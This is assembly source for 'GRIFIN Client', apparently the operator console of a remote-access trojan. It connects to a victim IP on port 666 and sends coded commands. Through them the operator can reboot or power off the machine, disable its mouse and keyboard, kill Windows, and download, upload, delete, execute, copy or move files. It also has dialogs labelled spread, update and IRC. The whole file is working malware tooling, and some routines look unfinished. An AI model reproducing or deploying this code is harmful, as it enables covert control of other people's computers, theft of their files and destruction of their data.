.386p
locals
jumps
.Model flat,STDCALL

; GRIFIN Client by Radix16/CIP
;
extrn GetModuleHandleA:PROC
extrn WSAStartup:PROC
extrn htons:PROC
extrn ExitProcess:PROC
extrn LoadIconA:PROC
extrn LoadCursorA:PROC
extrn DialogBoxParamA:PROC
extrn DefWindowProcA:PROC
extrn EndDialog:PROC
extrn socket:PROC
extrn closesocket:PROC
extrn recv:PROC
extrn GetFileSize:PROC
extrn send:PROC
extrn htons:PROC
extrn CloseHandle:PROC
extrn WSAStartup:PROC
extrn ReadFile:PROC
extrn GetDlgItemTextA:PROC
extrn CreateFileA:PROC
extrn inet_addr:PROC
extrn Sleep:PROC
extrn WSACleanup:PROC
extrn connect:PROC
extrn SetDlgItemTextA:PROC
extrn SendDlgItemMessageA:PROC
extrn WSAAsyncSelect:PROC

include useful.inc
include win32api.inc

AF_INET                 equ     2
PF_INET                 equ     2
SOCK_STREAM             equ     1



UCHAR                   EQU     <db>
USHORT                  EQU     <dw>  ; used only if we really need 16 bits
UINT                    EQU     <dd>  ; 32 bits for WIN32
ULONG                   EQU     <dd>


IDI_ICON1               EQU     100
L                       equ     <LARGE>

WM_USER                 =   0400H
WM_SOCKET           equ     WM_USER+100


ID_OPEN_CD      equ 124
ID_CLOSE_CD     equ 125
ID_MSG_BOX      equ 126
ID_REBOOT_SYSTEM    equ 115
ID_POWER_OFF        equ 110
ID_DOWNLOAD_FILE    equ 122
ID_UPLOAD_FILE      equ 123
ID_DELETE_FILE      equ 113
ID_EXECUTE_FILE     equ 119
ID_COPY_FILE        equ 121
ID_MOVE_FILE        equ 120
ID_MOUSE_OFF        equ 109
ID_KEYBOARD_OFF     equ 118
ID_KILL_WINDOWS     equ 112

ID_CMD_1        equ 104
ID_CMD_2        equ 106


ID_CONNECT      equ 101
ID_IP           equ 102
ID_EXIT         equ 103


ID_IRC          equ 111
ID_IRC_CANCEL       equ 523
ID_IRC_CONNECT      equ 524


ID_SPREAD       equ 117
ID_SPREAD_CANCEL    equ 790
ID_SPREAD_SEND      equ 789


ID_UPDATE       equ 116
ID_UPDATE_URL       equ 102
ID_UPDATE_CANCEL    equ 512
ID_UPDATE_GO        equ 513


ID_CHAT         equ 127
ID_CHAT_CANCEL      equ 555
ID_CHAT_SEND        equ 456
ID_CHAT_TAB     equ 1234
ID_CHAT_TEXT        equ 1235

IDD_TAB         equ 108

FD_READ             equ     001h
FD_WRITE            equ     002h
FD_OOB              equ     004h
FD_ACCEPT           equ     008h
FD_CONNECT              equ     010h
FD_CLOSE            equ     020h

; Class styles
;
CS_VREDRAW              =       0001h
CS_HREDRAW              =       0002h
CS_KEYCVTWINDOW         =       0004H
CS_DBLCLKS              =       0008h
SBS_SIZEGRIP            =       0010h
CS_OWNDC                =       0020h
CS_CLASSDC              =       0040h
CS_PARENTDC             =       0080h
CS_NOKEYCVT             =       0100h
CS_SAVEBITS             =       0800h
CS_NOCLOSE              =       0200h
CS_BYTEALIGNCLIENT      =       1000h
CS_BYTEALIGNWINDOW      =       2000h
CS_GLOBALCLASS          =       4000h    ; Global window class

;
;  Predefined cursor & icon IDs
;

IDC_ARROW               =       32512
IDC_IBEAM               =       32513
IDC_WAIT                =       32514
IDC_CROSS               =       32515
IDC_UPARROW             =       32516
IDC_SIZE                =       32640
IDC_ICON                =       32641
IDC_SIZENWSE            =       32642
IDC_SIZENESW            =       32643
IDC_SIZEWE              =       32644
IDC_SIZENS              =       32645


WM_NULL                 =       0000h
WM_CREATE               =       0001h
WM_DESTROY              =       0002h
WM_MOVE                 =       0003h
WM_SIZE                 =       0005h
WM_ACTIVATE             =       0006h
WM_SETFOCUS             =       0007h
WM_KILLFOCUS            =       0008h
WM_ENABLE               =       000Ah
WM_SETREDRAW            =       000Bh
WM_SETTEXT              =       000Ch
WM_GETTEXT              =       000Dh
WM_GETTEXTLENGTH        =       000Eh
WM_PAINT                =       000Fh
WM_CLOSE                =       0010h
WM_QUERYENDSESSION      =       0011h
WM_QUIT                 =       0012h
WM_QUERYOPEN            =       0013h
WM_ERASEBKGND           =       0014h
WM_SYSCOLORCHANGE       =       0015h
WM_ENDSESSION           =       0016h
WM_SYSTEMERROR          =       0017h
WM_SHOWWINDOW           =       0018h

WM_INITDIALOG           =       0110h
WM_COMMAND              =       0111h
WM_SYSCOMMAND           =       0112h
WM_TIMER                =       0113h
WM_HSCROLL              =       0114h
WM_VSCROLL              =       0115h
WM_INITMENU             =       0116h
WM_INITMENUPOPUP        =       0117h
WM_MENUSELECT           =       011Fh
WM_MENUCHAR             =       0120h
WM_ENTERIDLE            =       0121h

; ShowWindow() Commands
SW_HIDE                 =       0
SW_SHOWNORMAL           =       1
SW_NORMAL               =       1
SW_SHOWMINIMIZED        =       2
SW_SHOWMAXIMIZED        =       3
SW_MAXIMIZE             =       3
SW_SHOWNOACTIVATE       =       4
SW_SHOW                 =       5
SW_MINIMIZE             =       6
SW_SHOWMINNOACTIVE      =       7
SW_SHOWNA               =       8
SW_RESTORE              =       9

;
;  Edit Control Messages
;
EM_GETSEL             =  00B0h
EM_SETSEL             =  00B1h
EM_GETRECT            =  00B2h
EM_SETRECT            =  00B3h
EM_SETRECTNP          =  00B4h
EM_SCROLL             =  00B5h
EM_LINESCROLL         =  00B6h
EM_SCROLLCARET        =  00B7h
EM_GETMODIFY          =  00B8h
EM_SETMODIFY          =  00B9h
EM_GETLINECOUNT       =  00BAh
EM_LINEINDEX          =  00BBh
EM_SETHANDLE          =  00BCh
EM_GETHANDLE          =  00BDh
EM_GETTHUMB           =  00BEh
EM_LINELENGTH         =  00C1h
EM_REPLACESEL         =  00C2h
EM_GETLINE            =  00C4h
EM_LIMITTEXT          =  00C5h
EM_CANUNDO            =  00C6h
EM_UNDO               =  00C7h
EM_FMTLINES           =  00C8h
EM_LINEFROMCHAR       =  00C9h
EM_SETTABSTOPS        =  00CBh
EM_SETPASSWORDCHAR    =  00CCh
EM_EMPTYUNDOBUFFER    =  00CDh
EM_GETFIRSTVISIBLELINE=  00CEh
EM_SETREADONLY        =  00CFh
EM_SETWORDBREAKPROC   =  00D0h
EM_GETWORDBREAKPROC   =  00D1h
EM_GETPASSWORDCHAR    =  00D2h
EM_SETMARGINS         =  00D3h
EM_GETMARGINS         =  00D4h



.Data
    send_repeat dd  0
    file_open?  dd  0
    IO_Bytes_Count  dd  0
        hInst           dd      0
        hMenu           dd      0
        hDlg            dd      0
    fhandle     dd  0
    sockhandle  dd  0
    PORT        dd  666
    TheIP           db  16 dup (0)
        dlg_start       db      'START_CLIENT',0
    irc_dialog  db  'IRC_DIALOG',0
    spread_dialog   db  'SPREAD_DIALOG',0
    update_dialog   db  'UPDATE_DIALOG',0
    chat_dialog db  'CHAT_DIALOG',0

    grifin_welcome  db  '      !!!Welcome to GRIFIN!!!',13,10
            db  '         REMOTE CONTROL',13,10 
    line_g      db  '--------------------------------------------------------',0
    error_1     db  13,10,'Not Connect to IP...',13,10,0    


    open_cd     db  '!124'
    close_cd    db  '!125'
    msg_box     db  '!126'
    reboot_system   db  '!115'
    power_off   db  '!110'  
    download_file   db  '!122'
    key_off     db  '!118'
    mouse_off   db  '!109'
    kill_window db  '!211'

WNDCLASS struc
        clsStyle          UINT     ?
        clsLpfnWndProc    ULONG    ?
        clsCbClsExtra     UINT     ?
        clsCbWndExtra     UINT     ?
        clsHInstance      UINT     ?
        clsHIcon          UINT     ?
        clsHCursor        UINT     ?
        clsHbrBackground  UINT     ?
        clsLpszMenuName   ULONG    ?
        clsLpszClassName  ULONG    ?
        hIconSm           UINT     ?
WNDCLASS ends

MSGSTRUCT struc

        msHWND          UINT    ?
        msMESSAGE       UINT    ?
        msWPARAM        UINT    ?
        msLPARAM        ULONG   ?
        msTIME          ULONG   ?
        msPT            ULONG   2 dup(?)

MSGSTRUCT ends

WSADATA   struc

        mVersion        dw      ?
        mHighVersion    dw      ?
        szDescription   db      257 dup (?)
        szSystemStatus  db      129 dup (?)
        iMaxSockets     dw      ?
        iMaxUpdDg       dw      ?
        lpVendorInfo    dd      ?

WSADATA  ends

SOCKADDR  struc

        sin_family     dw      ?
        sin_port       dw      ?
        sin_addr       dd      ?
        sin_zero       db      8 dup (?)

SOCKADDR ends

        wsadata         WSADATA         <>
        sin             SOCKADDR        <>
        msg             MSGSTRUCT       <?>
        wc              WNDCLASS        <?>


    cmd_1       db  256 dup (00)
    cmd_2       db  256 dup (00)
    Send_Buffer db  256 dup (?)
    Read_Buffer db  256 dup (?)
    data_       db  16000 dup (?)

.Code

client:
        push    0
        call    GetModuleHandleA
        mov     [hInst], eax

    push    offset wsadata
    push    0101h
    call    WSAStartup

    push    0   
    push    SOCK_STREAM
    push    PF_INET
    call    socket

    mov sockhandle,eax

    mov     sin.sin_family, AF_INET
    push    PORT
    call    htons
    mov     sin.sin_port,ax 

reg_class:

        mov     [wc.clsStyle], CS_HREDRAW + CS_VREDRAW + CS_GLOBALCLASS
        mov     [wc.clsLpfnWndProc], offset WndProc
        mov     [wc.clsCbClsExtra], 0
        mov     [wc.clsCbWndExtra], 0

        mov     eax, [hInst]
        mov     [wc.clsHInstance], eax

        push    IDI_ICON1
        push    eax
        call    LoadIconA

        mov     [wc.clsHIcon], eax

        push    L IDC_ARROW
        push    L 0
        call    LoadCursorA
        mov     [wc.clsHCursor], eax

        push    0
        push    offset Main_Dialog
        push    0
        push    offset dlg_start
        push    [hInst]
        call    DialogBoxParamA
        jmp     Wnd_finish

WndProc proc hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    esi
        push    edi
        push    ebx

        push    [lparam]
        push    [wparam]
        push    [wmsg]
        push    [hwnd]
        call    DefWindowProcA

Wnd_finish:
        pop     ebx
        pop     edi
        pop     esi

        ret
WndProc endp

public WndProc



Main_Dialog proc hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    ebx
        push    esi
        push    edi

    cmp [wmsg],WM_INITDIALOG
    je  m_init
    cmp     [wmsg],WM_COMMAND
        je      m_command
        cmp     [wmsg], WM_CLOSE
        je      close_dialog

    mov     eax,FALSE
Dialog_end:
        pop     edi
        pop     esi
        pop     ebx

        ret


close_dialog:

    push    [sockhandle]
    call    closesocket

    call    WSACleanup

        push    L 0
        push    [hwnd]
        call    EndDialog
        mov     eax,TRUE
        jmp     Dialog_end


m_command:
    cmp [wparam],ID_EXIT
        je      close_dialog 
    cmp [wparam],ID_CONNECT
        je      connect_ 
    cmp [wparam],ID_IRC
        je      IRC_ 
    cmp [wparam],ID_SPREAD
        je      spread_ 
    cmp [wparam],ID_UPDATE
        je      update_ 
    cmp [wparam],ID_CHAT
        je      chat_ 
    cmp [wparam],ID_OPEN_CD
    je  opencd_
    cmp [wparam],ID_CLOSE_CD
    je  closecd_
    cmp [wparam],ID_MSG_BOX
    je  msgbox_
    cmp [wparam],ID_REBOOT_SYSTEM
    je  reboot_
    cmp [wparam],ID_POWER_OFF
    je  poweroff_
    cmp [wparam],ID_DOWNLOAD_FILE
    je  download_
    cmp [wparam],ID_UPLOAD_FILE
    je  upload_
    cmp [wparam],ID_DELETE_FILE
    je  deletef_
    cmp [wparam],ID_EXECUTE_FILE
    je  execute_
    cmp [wparam],ID_COPY_FILE
    je  copyf_
    cmp [wparam],ID_MOVE_FILE
    je  movef_
    cmp [wparam],ID_MOUSE_OFF
    je  mouseoff_
    cmp [wparam],ID_KEYBOARD_OFF
    je  keyboardoff_
    cmp [wparam],ID_KILL_WINDOWS
    je  killwindows_

    mov eax,FALSE
    jmp Dialog_end


m_init:
    push    offset grifin_welcome
    push    0
    push    EM_REPLACESEL
    push    IDD_TAB
    push    [hwnd]
    call    SendDlgItemMessageA

    mov eax,TRUE
    jmp Dialog_end

connect_:
    push    16  
    push    offset TheIP
    push    ID_IP
    push    [hwnd]
    call    GetDlgItemTextA 

    push    offset TheIP
    call    inet_addr
    
    mov     sin.sin_addr,eax

    push    16      
    push    offset sin
    push    [sockhandle]
    call    connect

    ;test   eax,eax
    ;jne    notc_1

    mov eax,FALSE
    jmp Dialog_end

notc_1:
    push    offset error_1
    push    0
    push    EM_REPLACESEL
    push    IDD_TAB
    push    [hwnd]
    call    SendDlgItemMessageA
    mov eax,FALSE
    jmp Dialog_end



IRC_:
        push    L 0                     
        push    offset irc_d
        push    [hwnd]
        push    offset irc_dialog
        push    [hInst]
        call    DialogBoxParamA
    jmp Dialog_end


spread_:
        push    L 0                     
        push    offset spread_d
        push    [hwnd]
        push    offset spread_dialog
        push    [hInst]
        call    DialogBoxParamA
    jmp Dialog_end

update_:
        push    L 0                     
        push    offset update_d
        push    [hwnd]
        push    offset update_dialog
        push    [hInst]
        call    DialogBoxParamA
    jmp Dialog_end

chat_:
        push    L 0                     
        push    offset chat_d
        push    [hwnd]
        push    offset chat_dialog
        push    [hInst]
        call    DialogBoxParamA
    jmp Dialog_end

opencd_:
    mov ecx,4
    mov eax,offset open_cd
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

closecd_:
    mov ecx,4
    mov eax,offset close_cd
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

msgbox_:
    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'621!' 
    mov edx, offset cmd_1

cmd_loop:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd_loop

    push    ebx

    push    256
    push    offset cmd_2
    push    ID_CMD_2
    push    [hwnd]
    call    GetDlgItemTextA 

    mov ecx,eax
    mov esi,eax

    pop ebx
    mov byte ptr [ebx+4],','
    inc ebx

    mov edx,offset cmd_2
    
cmd2_loop:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd2_loop

    pop eax

    mov ecx,eax
    add ecx,5
    add ecx,esi
    mov eax,offset data_
    call    send_c


    mov eax,FALSE
    jmp Dialog_end

reboot_:
    mov ecx,4
    mov eax,offset reboot_system
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

poweroff_:

    mov ecx,4
    mov eax,offset power_off
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

download_:
    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'221!' 
    mov edx, offset cmd_1

cmd_loop1:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd_loop1

    push    ebx

    push    256
    push    offset cmd_2
    push    ID_CMD_2
    push    [hwnd]
    call    GetDlgItemTextA 

    mov ecx,eax
    mov esi,eax

    pop ebx
    mov byte ptr [ebx+4],','
    inc ebx

    mov edx,offset cmd_2
    
cmd2_loop2:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd2_loop2

    pop eax

    mov ecx,eax
    add ecx,5
    add ecx,esi
    mov eax,offset data_
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

deletef_:
    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'311!' 
    mov edx, offset cmd_1

cmd_loop3:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd_loop3

    pop eax

    mov ecx,eax
    add ecx,4
    mov eax,offset data_
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

execute_:
    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'911!' 
    mov edx, offset cmd_1

cmd_loop4:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd_loop4

    pop eax

    mov ecx,eax
    add ecx,4
    mov eax,offset data_
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

copyf_:
    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'121!' 
    mov edx, offset cmd_1

cmd1_loop4:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd1_loop4

    push    ebx

    push    256
    push    offset cmd_2
    push    ID_CMD_2
    push    [hwnd]
    call    GetDlgItemTextA 

    mov ecx,eax
    mov esi,eax

    pop ebx
    mov byte ptr [ebx+4],','
    inc ebx

    mov edx,offset cmd_2
    
cmd4_loop:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd4_loop

    pop eax

    mov ecx,eax
    add ecx,5
    add ecx,esi
    mov eax,offset data_
    call    send_c


    mov eax,FALSE
    jmp Dialog_end

movef_:
    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'021!' 
    mov edx, offset cmd_1

cmd21_loop24:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd21_loop24

    push    ebx

    push    256
    push    offset cmd_2
    push    ID_CMD_2
    push    [hwnd]
    call    GetDlgItemTextA 

    mov ecx,eax
    mov esi,eax

    pop ebx
    mov byte ptr [ebx+4],','
    inc ebx

    mov edx,offset cmd_2
    
cmd14_loop:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd14_loop

    pop eax

    mov ecx,eax
    add ecx,5
    add ecx,esi
    mov eax,offset data_
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

mouseoff_:
    mov ecx,4
    mov eax,offset mouse_off
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

keyboardoff_:
    mov ecx,4
    mov eax,offset key_off
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

killwindows_:
    mov ecx,4
    mov eax,offset kill_window
    call    send_c

    mov eax,FALSE
    jmp Dialog_end

upload_:
    mov ebx, offset data_
    mov dword ptr [ebx],'321!'

    push    256
    push    offset cmd_2
    push    ID_CMD_2
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov edx, offset cmd_2
    mov ebx, offset data_

cmd14_loop44:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    cmd14_loop44

    push    ebx

    push    256
    push    offset cmd_1
    push    ID_CMD_1
    push    [hwnd]
    call    GetDlgItemTextA 

    cmp file_open?,0FFh
    je  skip_open

        xor ebx,ebx

        push    ebx
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ
    push    offset cmd_1
        call    CreateFileA

        mov [fhandle],eax

;        push    NULL
;        push    [fhandle]
;        call    GetFileSize

;        xchg    eax,ecx
;        jecxz   u_v_f


    mov file_open?,0FFh
skip_open:
    pop ebx
    mov byte ptr [ebx+4],','
    inc ebx
    add ebx,4

    pop eax
    mov ecx,16000
    sub ecx,eax
    sub ecx,5

        push    0
        push    offset IO_Bytes_Count
        push    ecx
        push    ebx
        push    [fhandle]
        call    ReadFile

    mov ecx,16000   
    mov eax,offset data_
    call    send_c

    cmp [send_repeat],3
    je  send_file_complete

    inc send_repeat 

    
    
    jmp msgbox_
    

send_file_complete:
    push    dword ptr [fhandle]
    call    CloseHandle

error_:
    mov eax,FALSE
    jmp Dialog_end

send_c:
    push    0
    push    ecx
    push    eax 
    push    [sockhandle]
    call    send
    ret

Main_Dialog endp
public Main_Dialog

irc_d proc hwnd2:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    ebx
        push    esi
        push    edi

        cmp     [wmsg], WM_CLOSE
        je      irc_end
    cmp     [wmsg],WM_COMMAND
        je      irc_command

        mov     eax,FALSE
irc_finish:
        pop     edi
        pop     esi
        pop     ebx

        ret

irc_end:
        push    L 0             
        push    [hwnd2]
        call    EndDialog
        mov     eax,TRUE        
        jmp     irc_finish

irc_command:
    cmp [wparam],ID_IRC_CANCEL
        je      irc_end 
    mov eax,FALSE
    jmp irc_finish


irc_d  endp
public irc_d

spread_d proc hwnd2:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    ebx
        push    esi
        push    edi

    cmp     [wmsg],WM_COMMAND
        je      spread_command
        cmp     [wmsg], WM_CLOSE
        je      spread_end

        mov     eax,FALSE
spread_finish:
        pop     edi
        pop     esi
        pop     ebx

        ret

spread_end:
        push    L 0             
        push    [hwnd2]
        call    EndDialog
        mov     eax,TRUE        
        jmp     spread_finish

spread_command:
    cmp [wparam],ID_SPREAD_CANCEL
        je      spread_end 
    mov eax,FALSE
    jmp spread_finish


spread_d endp
public spread_d

update_d proc hwnd2:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    ebx
        push    esi
        push    edi

        cmp     [wmsg], WM_CLOSE
        je      update_end
    cmp     [wmsg],WM_COMMAND
        je      update_command


        mov     eax,FALSE
update_finish:
        pop     edi
        pop     esi
        pop     ebx

        ret

update_end:
        push    L 0             
        push    [hwnd2]
        call    EndDialog
        mov     eax,TRUE        
        jmp     update_finish

update_start:

    push    256
    push    offset cmd_1
    push    ID_UPDATE_URL
    push    [hwnd]
    call    GetDlgItemTextA 

    push    eax

    mov ecx,eax
    mov ebx, offset data_
    mov dword ptr [ebx],'315!' 

    mov edx, offset cmd_1

up_cmd_loop4:
    mov al,[edx]
    mov byte ptr [ebx+4],al
    inc edx
    inc ebx
    loop    up_cmd_loop4

    pop eax

    mov ecx,eax
    add ecx,4
    mov eax,offset data_
    call    send_c


    mov eax,FALSE
    jmp update_finish

update_command:
    cmp [wparam],ID_UPDATE_CANCEL
        je      update_end 
    cmp [wparam],ID_UPDATE_GO
    je  update_start
    mov eax,FALSE
    jmp update_finish

update_d endp
public update_d

chat_d proc hwnd2:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    ebx
        push    esi
        push    edi


    cmp [wmsg],WM_INITDIALOG
    je  chat_init
    cmp [wmsg],WM_SOCKET
    je  chat_socket
        cmp     [wmsg], WM_CLOSE
        je      chat_end
    cmp     [wmsg],WM_COMMAND
        je      chat_command


        mov     eax,FALSE
chat_finish:
        pop     edi
        pop     esi
        pop     ebx

        ret

chat_init:
    push    FD_CONNECT+FD_CLOSE+FD_READ
    push    WM_SOCKET
    push    [hwnd2]
    push    [sockhandle]
    call    WSAAsyncSelect

    mov eax,TRUE
    jmp chat_finish


chat_end:
        push    L 0             
        push    [hwnd2]
        call    EndDialog
        mov     eax,TRUE        
        jmp     chat_finish

chat_command:
    cmp [wparam],ID_CHAT_CANCEL
        je      chat_end 
        cmp [wparam],ID_CHAT_SEND
    je  send_text

    mov eax,FALSE
    jmp chat_finish

chat_socket:
    push    0
    push    256
    push    offset Read_Buffer
    push    [sockhandle]
    call    recv    
    cmp eax,-1
    je  skip_2
    
    
    mov ecx,eax
    lea edi,Read_Buffer


    mov     ebx,offset Read_Buffer
    add ebx,eax 
    mov byte ptr [ebx],13
    mov byte ptr [ebx+1],10

    push    offset Read_Buffer
    push    0
    push    EM_REPLACESEL
    push    ID_CHAT_TAB
    push    [hwnd2]
    call    SendDlgItemMessageA             

    xor al,al
    mov ecx,256
    lea edi,Read_Buffer
    rep stosb
skip_2:

    mov eax,TRUE
    jmp chat_finish


send_text:
    push    256
    push    offset Send_Buffer
    push    ID_CHAT_TEXT
    push    [hwnd2]
    call    GetDlgItemTextA 

    push    eax

    mov     ebx,offset Send_Buffer
    add ebx,eax 
    mov byte ptr [ebx],13
    mov byte ptr [ebx+1],10

    push    offset Send_Buffer
    push    0
    push    EM_REPLACESEL
    push    ID_CHAT_TAB
    push    [hwnd2]
    call    SendDlgItemMessageA

    pop eax

    push    0
    push    eax
    push    offset Send_Buffer
    push    [sockhandle]
    call    send

    xor al,al
    mov ecx,256
    lea edi,Send_Buffer
    rep stosb

    push    offset Send_Buffer
    push    ID_CHAT_TEXT
    push    [hwnd2]
    call    SetDlgItemTextA

    mov eax,TRUE
    jmp chat_finish


chat_d endp

public chat_d



end client
